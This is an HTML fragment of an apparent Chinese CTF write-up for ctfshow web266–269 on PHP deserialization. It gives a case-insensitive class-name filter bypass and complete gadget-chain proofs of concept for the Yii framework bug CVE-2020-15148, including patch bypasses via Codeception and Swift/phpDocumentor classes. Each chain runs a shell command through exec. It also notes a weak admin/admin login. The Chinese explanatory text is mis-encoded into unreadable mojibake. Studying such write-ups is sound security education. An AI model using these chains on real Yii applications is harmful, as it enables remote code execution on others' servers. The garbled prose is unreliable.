srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web266-ç±»å’Œæ–¹æ³•ä¸åŒºåˆ†å¤§å°å†™"><a href="#web266-ç±»å’Œæ–¹æ³•ä¸åŒºåˆ†å¤§å°å†™" class="headerlink" title="web266 ç±»å’Œæ–¹æ³•ä¸åŒºåˆ†å¤§å°å†™"></a>web266 ç±»å’Œæ–¹æ³•ä¸åŒºåˆ†å¤§å°å†™</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='PHPç‰¹æ€§'><i class='fas fa-tag'></i>PHPç‰¹æ€§</a></span> <span class='btn'><a class="button"  title='ç±»å’Œæ–¹æ³•ä¸åŒºåˆ†å¤§å°å†™'><i class='fas fa-tag'></i>ç±»å’Œæ–¹æ³•ä¸åŒºåˆ†å¤§å°å†™</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@unserialize(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‹¦æˆªç‚¹ï¼šåºåˆ—åŒ–æ•°æ®ä¸èƒ½åŒ…æ‹¬ ctfshowï¼Œ</p><p>PHPç‰¹æ€§ï¼šå‡½æ•°åå’Œç±»åä¸åŒºåˆ†å¤§å°å†™ï¼Œå˜é‡ååŒºåˆ†ï¼Œä¾‹å¦‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616400756179-42e8ddb5-3032-4279-890a-c8309b692551.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616400756179-42e8ddb5-3032-4279-890a-c8309b692551.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> Ctfshow();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="variable">$user</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616400835787-767b0472-9b2a-45f2-9948-cf283fe83a84.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616400835787-767b0472-9b2a-45f2-9948-cf283fe83a84.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web267-Yii-æ¡†æ¶-CVE"><a href="#web267-Yii-æ¡†æ¶-CVE" class="headerlink" title="web267 Yii æ¡†æ¶ CVE"></a>web267 Yii æ¡†æ¶ CVE</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='æ¡†æ¶å®¡è®¡'><i class='fas fa-tag'></i>æ¡†æ¶å®¡è®¡</a></span> <span class='btn'><a class="button"  title='CVE-2020-15148'><i class='fas fa-tag'></i>CVE-2020-15148</a></span> <span class='btn'><a class="button"  title='Yiiç™»å½•å‰'><i class='fas fa-tag'></i>Yiiç™»å½•å‰</a></span><p>å¼±å¯†ç  admin/admin ç™»å½•</p><p>about é¡µé¢æœ‰ä¸ª <code>&lt;!--?view-source --&gt;</code> æç¤º</p><p>å¯ä»¥é€šè¿‡ <code>index.php?r=site%2Fabout&amp;view-source</code>  æŸ¥çœ‹æç¤º</p><p>è¿™æ˜¯ Yii çš„è·¯ç”±è§„åˆ™ï¼Œ<a href="">ä¼ é€é—¨</a> ï¼Œå’‹çŸ¥é“çš„ Yiiï¼Ÿé€šè¿‡ burp æŠ“åŒ…è®°å½•çœ‹åˆ°å¾ˆå¤š yii.js php æœäº†ä¸‹ ï¼ˆ</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616402276579-e299f950-a016-470d-a074-50d8bd152a0b.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616402276579-e299f950-a016-470d-a074-50d8bd152a0b.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>æ¡†æ¶ååºåˆ—åŒ–æ¼æ´ï¼Œç½‘ä¸Šåº”è¯¥å¯ä»¥æœåˆ°ï¼Œä¸€ä¸ªä¸é”™çš„å¤ç°å’ŒæŒ–æ˜æ–‡ç« ï¼Œ<a href="https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&mid=2247485129&idx=1&sn=b27e3fe845daee2fb13bb9f36f53ab40">ä¼ é€é—¨</a></p><p>æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fla* tari.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418296385-87908407-06a1-4ca9-8794-41c979aae43d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418296385-87908407-06a1-4ca9-8794-41c979aae43d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418312321-77ea19e7-cfa2-46b8-a48c-60480c6b93f6.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418312321-77ea19e7-cfa2-46b8-a48c-60480c6b93f6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web268-Yii-æ¡†æ¶-CVE-è¡¥ä¸ç»•è¿‡-1"><a href="#web268-Yii-æ¡†æ¶-CVE-è¡¥ä¸ç»•è¿‡-1" class="headerlink" title="web268 Yii æ¡†æ¶ CVE è¡¥ä¸ç»•è¿‡ 1"></a>web268 Yii æ¡†æ¶ CVE è¡¥ä¸ç»•è¿‡ 1</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='æ¡†æ¶å®¡è®¡'><i class='fas fa-tag'></i>æ¡†æ¶å®¡è®¡</a></span> <span class='btn'><a class="button"  title='CVE-2020-15148'><i class='fas fa-tag'></i>CVE-2020-15148</a></span> <span class='btn'><a class="button"  title='Yiiç™»å½•å‰'><i class='fas fa-tag'></i>Yiiç™»å½•å‰</a></span> <span class='btn'><a class="button"  title='è¡¥ä¸ç»•è¿‡'><i class='fas fa-tag'></i>è¡¥ä¸ç»•è¿‡</a></span><p>æ€è·¯ç±»ä¼¼ web267ï¼Œä¼°è®¡æ˜¯æ‰“è¿‡è¡¥ä¸ç‰ˆæœ¬</p><p>æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ</p><p>poc1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fla* tari.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// è¿™é‡Œéœ€è¦æ”¹ä¸ºisRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc1</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418794354-553cc83f-c9de-4c72-be0e-c0be7a18e0c6.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418794354-553cc83f-c9de-4c72-be0e-c0be7a18e0c6.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418838500-9a9582d8-ecb0-4a56-8cba-fd383708503b.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418838500-9a9582d8-ecb0-4a56-8cba-fd383708503b.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web269-Yii-æ¡†æ¶-CVE-è¡¥ä¸ç»•è¿‡-2"><a href="#web269-Yii-æ¡†æ¶-CVE-è¡¥ä¸ç»•è¿‡-2" class="headerlink" title="web269 Yii æ¡†æ¶ CVE è¡¥ä¸ç»•è¿‡ 2"></a>web269 Yii æ¡†æ¶ CVE è¡¥ä¸ç»•è¿‡ 2</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='æ¡†æ¶å®¡è®¡'><i class='fas fa-tag'></i>æ¡†æ¶å®¡è®¡</a></span> <span class='btn'><a class="button"  title='CVE-2020-15148'><i class='fas fa-tag'></i>CVE-2020-15148</a></span> <span class='btn'><a class="button"  title='Yiiç™»å½•å‰'><i class='fas fa-tag'></i>Yiiç™»å½•å‰</a></span> <span class='btn'><a class="button"  title='è¡¥ä¸ç»•è¿‡'><i class='fas fa-tag'></i>è¡¥ä¸ç»•è¿‡</a></span><p>æ€è·¯ç±»ä¼¼ web267ï¼Œä¼°è®¡æ˜¯æ‰“è¿‡è¡¥ä¸ç‰ˆæœ¬</p><p>æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ</p><p>poc2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fla* tari.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="comment">// æœ‰å°±è¡Œ</span></span><br><span class="line">                <span class="string">&quot;suiyi&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;suiyi&quot;</span>=&gt;<span class="string">&quot;suiyi&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616419493789-61249473-3d01-4840-a0ca-26b48fc4139b.png?x-oss-process=image/resize,w_1500" class="lazyload" 